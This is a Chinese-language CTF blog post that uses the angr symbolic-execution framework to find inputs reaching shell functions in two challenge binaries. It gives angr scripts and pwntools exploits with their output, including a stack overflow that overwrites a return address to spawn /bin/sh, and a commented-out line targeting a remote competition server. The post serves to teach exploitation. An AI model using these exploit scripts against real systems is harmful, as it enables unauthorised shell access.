<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>AUTO PWN | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>AUTO PWN</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-03-31T07:58:43.000Z" id="date"> 2021-03-31</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-24T09:57:23.082Z" id="updated"> 2022-10-24</time></div></span><br><span>Word Count: <div class="control">2.3k</div></span><br><span>Read Time: <div class="control">11 min</div></span></div></div><hr><div id="post-content"><h1 id="AUTO-PWN"><a href="#AUTO-PWN" class="headerlink" title="AUTO PWN"></a>AUTO PWN</h1><p>ref: <a target="_blank" rel="noopener" href="https://angr.io/">https://angr.io/</a></p>
<p>ref:  <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266757.htm">https://bbs.pediy.com/thread-266757.htm</a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>目前，CTF的PWN题越来越难以PWN掉，漏洞的挖掘和利用正逐步由人工向自动化。本文主要介绍自动化挖掘的一些实例，来学习自动化挖掘。</p>
<p>然而，目前angr框架是个很不错的选择，angr是二进制分析的一个开源python框架。它采用符号执行技术，其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。</p>
<p>开源地址: <a target="_blank" rel="noopener" href="https://github.com/angr/angr">https://github.com/angr/angr</a></p>
<p>涉及题目附件找i0gan要。</p>
<h3 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h3><p>为了方便不与pwntools库引起冲突，我们采用拉取docker镜像的方式进行使用，当然也可以直接 pip install angr也可以。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker pull angr/angr<br></code></pre></td></tr></table></figure>



<p>在开始之前，我使用angr docker来运行scirpt，我编写了一个bash脚本来运行我们的angr脚本，如下所示，方便例1和例2使用。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/sh</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># for starting docker angr</span><br><span class="hljs-built_in">pwd</span>=`<span class="hljs-built_in">pwd</span>`<br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> &lt; 2 ]];<span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage angr script.py&quot;</span><br>    <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br>script=<span class="hljs-variable">$1</span><br>docker run -it -u angr --<span class="hljs-built_in">rm</span> -v <span class="hljs-variable">$pwd</span>:/mnt -w /mnt angr/angr <span class="hljs-string">&quot;/home/angr/.virtualenvs/angr/bin/python&quot;</span> <span class="hljs-string">&quot;/mnt/<span class="hljs-variable">$script</span>&quot;</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span><br></code></pre></td></tr></table></figure>

<p>Usage:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./angr script.py<br></code></pre></td></tr></table></figure>





<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>来自2021红明谷杯总决赛</p>
<p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Checksec file: pwn1<br>[*] &#x27;/run/media/i0gan/disk1/share/project/auto_pwn/pwn1&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>

<p>运行情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">~/share/project/auto_pwn  ./pwn1                                                                                                 <br>asdf<br>input your passwd:<br>asdfasdf<br>asdf<br>input your passwd:<br></code></pre></td></tr></table></figure>



<p>程序逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_804870E</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  result = inputn();<br>  v2 = result;<br>  <span class="hljs-keyword">switch</span> ( result )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;logging out...&quot;</span>);<br>      result = ~dword_804A06C;<br>      dword_804A06C = ~dword_804A06C;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">if</span> ( dword_804A06C )<br>        result = shell(); <span class="hljs-comment">// shell函数</span><br>      <span class="hljs-keyword">else</span><br>        result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please log in&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input your passwd:&quot;</span>);<br>      result = sub_804859B((<span class="hljs-type">int</span>)v1, <span class="hljs-number">16</span>); <span class="hljs-comment">// 输入密码</span><br>      dword_804A06C = <span class="hljs-number">1</span>; <span class="hljs-comment">// 正确之后，设置dword_804A06C为1，才可以获得shell</span><br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上面，我们不知道密码是什么，我们也不管它是什么，我们只要能拿到shell就可以，那么如何让程序流跳到shell函数呢？angr可以方便的来实现。</p>
<p>下面就是shell函数的地址，只要能使程序流执行到<code>0x08048783</code>，我们就可以拿到shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:0804877A loc_804877A:                            ; CODE XREF: sub_804870E+19↑j<br>.text:0804877A                 mov     eax, ds:dword_804A06C<br>.text:0804877F                 test    eax, eax<br>.text:08048781                 jz      short loc_804878A<br>.text:08048783                 call    shell<br>.text:08048788                 jmp     short loc_804879A<br></code></pre></td></tr></table></figure>

<p>好了，我们只要使程序流跑到我们的目标地址，再把输入数据给dump出来，dump出来的数据也就是我们的payload数据了。</p>
<p>angr脚本pwn1_angr.py 如下 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment">#logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;INFO&#x27;)</span><br>logging.getLogger(<span class="hljs-string">&#x27;angr&#x27;</span>).setLevel(<span class="hljs-string">&#x27;CRITICAL&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">angr_main</span>():<br>    pj = angr.Project(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>    state = pj.factory.entry_state()<br>    simgr = pj.factory.simgr(state)<br>    simgr.explore(find = <span class="hljs-number">0x08048783</span>) <span class="hljs-comment"># call shell</span><br>    p = simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(b2a_hex(p).decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>angr_main()<br></code></pre></td></tr></table></figure>

<p>运行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./angr pwn1_angr.py <br>310a320a<br></code></pre></td></tr></table></figure>

<p>这里我采用16进制方式打印出数据的，payload就是’\x31\x0a\x32\x0a’</p>
<p>测试:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./pwn1<br>1<br>logging out...<br>2<br>sh-5.1$ whoami<br>i0gan<br></code></pre></td></tr></table></figure>

<p>好了，现在我们得到了拿到shell的payload，那么我们怎么实现自动化去挖掘和pwn掉它呢？</p>
<p>我们只需要让他先本地自动挖掘之后，让他自动打远程，如下。</p>
<p>pwn1_exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex<br><br>io = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Solving...&#x27;</span>)<br>p = os.popen(<span class="hljs-string">&#x27;./angr pwn1_angr.py&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Found payload: [&#x27;</span> + p + <span class="hljs-string">&#x27;]&#x27;</span>)<br>p = a2b_hex(p)<br>io.send(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Get shell&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>运行pwn1_exp.py脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python pwn1_exp.py<br>[+] Starting local process &#x27;./pwn1&#x27;: pid 18152<br>Solving...<br>Found payload: [310a320a]<br>Get shell<br>[*] Switching to interactive mode<br>logging out...<br>i0gan<br></code></pre></td></tr></table></figure>

<p>通过以上实验，我们也可以自己来改进，我们是通过手动分析shell的函数在哪里，当然我们也可以让他自动找这个函数。</p>
<p>这个例子比较简单的，但感觉比手动分析的没什么两样，下面我们来个有用的。</p>
<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>来自第六届全国网络空间安全技术大赛</p>
<p>ida打开之后，对main函数进行F5，发现IDA报下面错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Decompilation failure:<br>8048764: too big function<br>Please refer to the manual to find appropriate actions<br></code></pre></td></tr></table></figure>

<p>采用汇编查看图报下面错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">The graph is too big (more than 1000 nodes) to be displayed on the screen.<br>Switching to text mode.<br>(you can change this limit in the graph options dialog)<br></code></pre></td></tr></table></figure>

<p>这是由于程序函数中的代码分支块太多，IDA没法生成图和伪代码来利于我们分析。</p>
<p>我截一部分有用代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>.text:080487C6<br>.text:080487C6 loc_80487C6:                            ; CODE XREF: main+51↑j<br>.text:080487C6                 cmp     [ebp+var_C], 13h<br>.text:080487CA                 jle     short loc_80487B7<br>.text:080487CC                 lea     eax, [ebp+s2]<br>.text:080487CF                 mov     dword ptr [eax], 4A494355h<br>.text:080487D5                 mov     dword ptr [eax+4], 49525545h<br>.text:080487DC                 sub     esp, 0Ch<br>.text:080487DF                 push    offset aEnterThePasswo_0 ; &quot;Enter the password: &quot;<br>.text:080487E4                 call    _puts<br>.text:080487E9                 add     esp, 10h<br>.text:080487EC                 sub     esp, 8<br>.text:080487EF                 lea     eax, [ebp+s1]<br>.text:080487F2                 push    eax<br>.text:080487F3                 push    offset a8s      ; &quot;%8s&quot;<br>.text:080487F8                 call    _scanf // 输入8个字符的数据<br>.text:080487FD                 add     esp, 10h<br>.text:08048800                 mov     [ebp+var_10], 0<br>.text:08048807                 jmp     short loc_8048836<br></code></pre></td></tr></table></figure>

<p>输入8个字符之后，就跳到了函数代码分支块中不断的跳来跳去的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:08048836 loc_8048836:                            ; CODE XREF: main+A3↑j<br>.text:08048836                 cmp     [ebp+var_10], 7<br>.text:0804883A                 jle     short loc_8048809<br>.text:0804883C                 lea     eax, [ebp+s1]<br>.text:0804883F                 add     eax, 1<br>.text:08048842                 movzx   eax, byte ptr [eax]<br>.text:08048845                 movzx   eax, al<br>.text:08048848                 and     eax, 10h<br>.text:0804884B                 test    eax, eax<br>.text:0804884D                 setnz   dl<br>.text:08048850                 lea     eax, [ebp+s2]<br>.text:08048853                 add     eax, 1<br>.text:08048856                 movzx   eax, byte ptr [eax]<br>.text:08048859                 movzx   eax, al<br>.text:0804885C                 and     eax, 10h<br>.text:0804885F                 test    eax, eax<br>.text:08048861                 setnz   al<br>.text:08048864                 xor     eax, edx<br>.text:08048866                 test    al, al<br>.text:08048868                 jz      loc_808E7DC<br>.text:0804886E                 call    aaz<br>.text:08048873                 lea     eax, [ebp+s1]<br>....<br></code></pre></td></tr></table></figure>

<p>然而发现有个函数有堆栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">login_again</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [esp+0h] [ebp-48h] BYREF</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter the password again: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;deadbeef&quot;</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can&#x27;t get shell&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>且有后门函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_sh</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>若我们输入某些数据，能够使程序流执行到该函数，那么我们就可以利用该漏洞来获得shell，当然我们也可以直接使程序流跳到get_sh函数，但分支块中是没有用到get_sh函数的，而login_again在 ass函数中进行调用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">aas</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( should_succeed &amp;&amp; !<span class="hljs-built_in">strncmp</span>(s1, s2, <span class="hljs-number">8u</span>) )<br>    result = login_again();                     <span class="hljs-comment">// vul</span><br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error.&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ass函数也是在代码分支块中进行调用，所以这类似于fuzz，fuzz有关系的路径比没关系的要容易得多，我们就使程序流到达login_again之后，再利用堆栈溢出漏洞调用后门函数即可。</p>
<p>与例1差不多，只需要让angr引擎找到一个输入的数据满足程序流到达login_again函数即可。</p>
<p>编写angr脚本如下:</p>
<p>auto_angr.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> sys<br>logging.getLogger(<span class="hljs-string">&#x27;angr&#x27;</span>).setLevel(<span class="hljs-string">&#x27;INFO&#x27;</span>)<br><span class="hljs-comment">#logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;CRITICAL&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">angr_main</span>():<br>    pj = angr.Project(<span class="hljs-string">&#x27;./auto&#x27;</span>)<br>    state = pj.factory.entry_state()<br>    simgr = pj.factory.simgr(state)<br>    simgr.explore(find = <span class="hljs-number">0x0804867E</span>) <span class="hljs-comment"># call login_again</span><br>    p = simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(b2a_hex(p).decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>angr_main()<br><br></code></pre></td></tr></table></figure>

<p>这里还是借助之前我们写的一个angr脚本。</p>
<p>运行如下: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./angr auto_angr.py <br>555859554b564e5a<br></code></pre></td></tr></table></figure>

<p>那么我们得到的payload就是’\x55\x58\x59\x55\x4b\x56\x4e\x5a’，这个输入能够使我们的程序流执行到login_again函数，之后呢我们就采用简单的堆栈溢出达到获得shell了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io = remote(&#x27;81.70.195.166&#x27;, 10001)</span><br>io = process(<span class="hljs-string">&#x27;./auto&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;\x55\x58\x59\x55\x4b\x56\x4e\x5a&#x27;</span><br>io.send(payload)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x48</span> +  p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x08048665</span>) <span class="hljs-comment"># 修改返回地址到get_sh函数</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>运行如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[+] Starting local process &#x27;./auto&#x27; argv=[b&#x27;./auto&#x27;] : pid 6957<br>[DEBUG] Sent 0x8 bytes:<br>    b&#x27;UXYUKVNZ&#x27;<br>[DEBUG] Sent 0x51 bytes:<br>    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│<br>    *<br>    00000040  00 00 00 00  00 00 00 00  00 00 00 00  65 86 04 08  │····│····│····│e···│<br>    00000050  0a                                                  │·│<br>    00000051<br>[*] Switching to interactive mode<br>[DEBUG] Received 0x37 bytes:<br>    b&#x27;Enter the password: \n&#x27;<br>    b&#x27;Enter the password again: \n&#x27;<br>    b&#x27;Error.\n&#x27;<br>Enter the password: <br>Enter the password again: <br>Error.<br>$ whoami<br>[DEBUG] Sent 0x7 bytes:<br>    b&#x27;whoami\n&#x27;<br>[DEBUG] Received 0x6 bytes:<br>    b&#x27;i0gan\n&#x27;<br>i0gan<br><br></code></pre></td></tr></table></figure>





<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过以上两个例子，我们没有去分析输入之后程序是怎么处理该数据的，我们只关心结果，面对例子2，手动分析和调试起来极其困难，程序太大了，人工分析起来很困难，这时候，借助AUTO PWN的手段，很方便我们能够找的payload，我这个惨杂了手工分析的一些参数，这只是方便于理解，当然也可以开发出自己的一套自动化系统，自动去识别程序逻辑，完成自动构建payload，这也是今后需要不断提升和研究的。目前很多pwn也需要该手段，比如xctf中start ctf babypac可以采用angr引擎很方便的找到触发漏洞的payload，那个是个aarch架构的pwn，angr引擎是跨架构的，不影响angr来实现符号执行分析，还有vm pwn这些，若懒得分析程序逻辑，只想快速找到每个opcode对应什么分支块，采用该技术也是Perfect!。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/04/01/security/cve/CVE-2021-3156/">← Next Heap-Based Buffer Overflow in Sudo</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2021/03/31/security/fuzz/fuzz-afl/">Binary fuzzing way of american fuzzy lop Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AUTO-PWN"><span class="toc-text">AUTO PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85angr"><span class="toc-text">安装angr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1"><span class="toc-text">Example 1</span></a></li><li class="toc-item 